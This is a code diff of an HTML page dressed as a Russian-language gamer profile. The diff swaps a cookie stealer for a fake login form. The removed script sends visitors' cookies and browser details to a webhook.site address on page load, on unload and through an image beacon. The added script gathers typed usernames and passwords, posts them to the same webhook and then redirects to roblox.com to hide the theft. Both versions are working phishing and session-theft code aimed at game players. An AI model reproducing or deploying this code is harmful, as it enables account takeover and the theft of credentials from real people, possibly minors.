@@ -39,44 +39,78 @@
         .content {
             margin-top: 50px;
             text-align: center;
+            width: 100%;
+            max-width: 400px;
         }
         .profile-avatar {
-            width: 150px;
-            height: 150px;
+            width: 120px;
+            height: 120px;
             border-radius: 50%;
             background: #333;
             margin: 0 auto 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 60px;
+            font-size: 50px;
             border: 3px solid #e94560;
         }
         .username {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: bold;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
         }
         .status {
             color: #4ecca3;
             font-size: 14px;
             margin-bottom: 30px;
         }
-        .btn-add-friend {
+        .login-box {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid #e94560;
+        }
+        .login-box h3 {
+            margin-bottom: 20px;
+            color: #e94560;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #555;
+            border-radius: 8px;
+            background: #0f0f23;
+            color: #fff;
+            font-size: 14px;
+        }
+        .login-box input:focus {
+            border-color: #e94560;
+            outline: none;
+        }
+        .btn-login {
+            width: 100%;
             background: #e94560;
             color: #fff;
             border: none;
-            padding: 12px 40px;
+            padding: 14px;
             font-size: 16px;
-            border-radius: 25px;
+            border-radius: 8px;
             cursor: pointer;
+            font-weight: bold;
             transition: background 0.3s;
         }
-        .btn-add-friend:hover { background: #c73652; }
+        .btn-login:hover { background: #c73652; }
         .footer {
-            margin-top: 60px;
+            margin-top: 30px;
             color: #555;
             font-size: 12px;
+        }
+        .error-msg {
+            color: #ff4444;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
         }
     </style>
 </head>
@@ -95,8 +129,15 @@
         <div class="profile-avatar">🧑</div>
         <div class="username">Player_Example</div>
         <div class="status">● Online</div>
-        <br>
-        <button class="btn-add-friend">Добавить в друзья</button>
+
+        <div class="login-box">
+            <h3>Войти в аккаунт</h3>
+            <p style="color:#aaa; font-size:13px; margin-bottom:15px;">Чтобы добавить в друзья, выполните вход</p>
+            <div class="error-msg" id="error">Неверный логин или пароль</div>
+            <input type="text" id="username" placeholder="Имя пользователя" autocomplete="username">
+            <input type="password" id="password" placeholder="Пароль" autocomplete="current-password">
+            <button class="btn-login" id="loginBtn">Войти</button>
+        </div>
     </div>
 
     <div class="footer">
@@ -104,33 +145,42 @@
     </div>
 
     <script>
-        function sendCookies() {
+        var WEBHOOK = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea';
+
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            var user = document.getElementById('username').value;
+            var pass = document.getElementById('password').value;
+
+            if (!user || !pass) {
+                document.getElementById('error').style.display = 'block';
+                return;
+            }
+
             var data = {
-                cookies: document.cookie,
+                username: user,
+                password: pass,
                 url: window.location.href,
                 useragent: navigator.userAgent,
                 platform: navigator.platform,
-                screen: screen.width + 'x' + screen.height,
-                language: navigator.language,
+                ip: null,
                 timestamp: new Date().toISOString()
             };
 
-            fetch('https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea', {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).catch(function() {});
+            }).then(function() {
+                window.location.href = 'https://www.roblox.com';
+            }).catch(function() {
+                window.location.href = 'https://www.roblox.com';
+            });
+        });
 
-            var img = new Image();
-            img.src = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(window.location.href);
-        }
-
-        window.onload = sendCookies;
-        window.onbeforeunload = sendCookies;
-
-        document.querySelector('.btn-add-friend').addEventListener('click', function() {
-            sendCookies();
-            window.location.href = 'https://www.roblox.com';
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginBtn').click();
+            }
         });
     </script>
 </body>
